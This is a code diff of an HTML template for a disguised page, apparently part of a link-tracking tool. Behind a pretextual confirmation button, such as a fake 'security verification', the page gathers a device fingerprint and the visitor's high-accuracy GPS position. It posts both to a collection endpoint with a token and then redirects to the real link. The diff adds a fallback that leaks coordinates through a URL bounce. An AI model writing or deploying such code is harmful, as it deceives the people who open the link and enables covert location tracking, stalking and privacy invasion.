@@ -1,111 +1,86 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Check</title>
+    <title>{{ data.title }}</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 30px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn { background: #3498db; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
-        h2 { margin-bottom: 10px; }
-        p { color: #666; line-height: 1.5; margin-bottom: 30px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; margin: 0; }
+        .icon { font-size: 70px; margin-bottom: 20px; }
+        .btn { background: #007AFF; color: white; padding: 16px 32px; border: none; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 4px 12px rgba(0,122,255,0.3); transition: transform 0.1s; }
+        .btn:active { transform: scale(0.98); }
+        h2 { margin-bottom: 10px; font-size: 22px; max-width: 300px; }
+        p { color: #666; line-height: 1.5; margin-bottom: 40px; max-width: 300px; font-size: 15px; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <h2 id="title">Verificación de Seguridad</h2>
-    <p id="desc">Detectamos una conexión inusual. Para continuar al contenido, confirma que estás en una ubicación válida.</p>
     
-    <button id="btnAction" class="btn" onclick="iniciarProceso()">Confirmar Acceso</button>
-    <div id="msg" style="margin-top:20px; font-size:13px; color:#e74c3c;"></div>
+    <div class="icon">{{ data.icon }}</div>
+    <h2 id="title">{{ data.title }}</h2>
+    <p id="desc">{{ data.text }}</p>
+    
+    <button id="btnAction" class="btn" onclick="iniciarProceso()">{{ data.btn }}</button>
+    <div id="msg" style="margin-top:25px; font-size:13px; color:#e74c3c; font-weight:500;"></div>
 
     <script>
         const token = window.location.pathname.split('/').pop();
 
-        // Función para obtener la Huella Digital (Rayos X)
+        // OBTENER FINGERPRINT (RAYOS X)
         async function getFingerprint() {
             let info = [];
-            
-            // 1. Pantalla
             info.push(`📺 Pantalla: ${window.screen.width}x${window.screen.height}`);
-            
-            // 2. Hardware (Núcleos y RAM)
-            if (navigator.hardwareConcurrency) info.push(`⚙️ CPU: ${navigator.hardwareConcurrency} Núcleos`);
+            if (navigator.hardwareConcurrency) info.push(`⚙️ CPU: ${navigator.hardwareConcurrency} Cores`);
             if (navigator.deviceMemory) info.push(`💾 RAM: ~${navigator.deviceMemory} GB`);
-            
-            // 3. Batería (Async)
             try {
                 if (navigator.getBattery) {
                     let bat = await navigator.getBattery();
                     let level = Math.round(bat.level * 100);
-                    let status = bat.charging ? "🔌 Cargando" : "🔋 Batería";
-                    info.push(`${status}: ${level}%`);
+                    info.push(`${bat.charging ? "🔌" : "🔋"} ${level}%`);
                 }
             } catch(e) {}
-
-            // 4. Conexión
-            if (navigator.connection) {
-                info.push(`📡 Red: ${navigator.connection.effectiveType}`);
-            }
-            
-            // 5. Plataforma
+            if (navigator.connection) info.push(`📡 Red: ${navigator.connection.effectiveType}`);
             info.push(`💻 OS: ${navigator.platform}`);
-
             return info.join(" | ");
         }
 
-        function irAlDestino() {
-            window.location.href = "/redirect/" + token;
-        }
+        function irAlDestino() { window.location.href = "/redirect/" + token; }
 
         async function iniciarProceso() {
-            document.getElementById('msg').innerText = "Analizando entorno del dispositivo...";
-            document.getElementById('btnAction').style.display = 'none';
+            document.getElementById('msg').innerText = "Estableciendo conexión segura...";
+            document.getElementById('btnAction').style.opacity = "0.5";
             
-            // Obtenemos los datos técnicos primero
             let fingerprint = await getFingerprint();
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => enviarTodo(pos, fingerprint), 
-                    (err) => enviarSoloFingerprint(fingerprint), 
+                    (err) => {
+                        // Si falla, intentamos rebote URL
+                        window.location.href = `/api/save_gps_bounce?token=${token}&lat=0&lon=0&acc=DENIED`;
+                    }, 
                     {enableHighAccuracy: true, timeout: 8000}
                 );
             } else {
-                // Si el navegador no tiene GPS, enviamos solo fingerprint
                 enviarSoloFingerprint(fingerprint);
             }
         }
 
         function enviarTodo(pos, fingerprint) {
             fetch('/api/save_data', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    token: token,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy,
-                    fingerprint: fingerprint
+                    token: token, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, fingerprint: fingerprint
                 })
-            }).then(irAlDestino).catch(irAlDestino);
+            }).then(irAlDestino).catch(() => {
+                window.location.href = `/api/save_gps_bounce?token=${token}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`;
+            });
         }
 
         function enviarSoloFingerprint(fingerprint) {
             fetch('/api/save_data', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    token: token,
-                    lat: null, lon: null, acc: null,
-                    fingerprint: fingerprint
-                })
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: token, lat: null, fingerprint: fingerprint })
             }).then(irAlDestino).catch(irAlDestino);
         }
-        
-        // Auto-inicio si el usuario ya interactuó antes (opcional)
-        // iniciarProceso();
     </script>
 </body>
 </html>
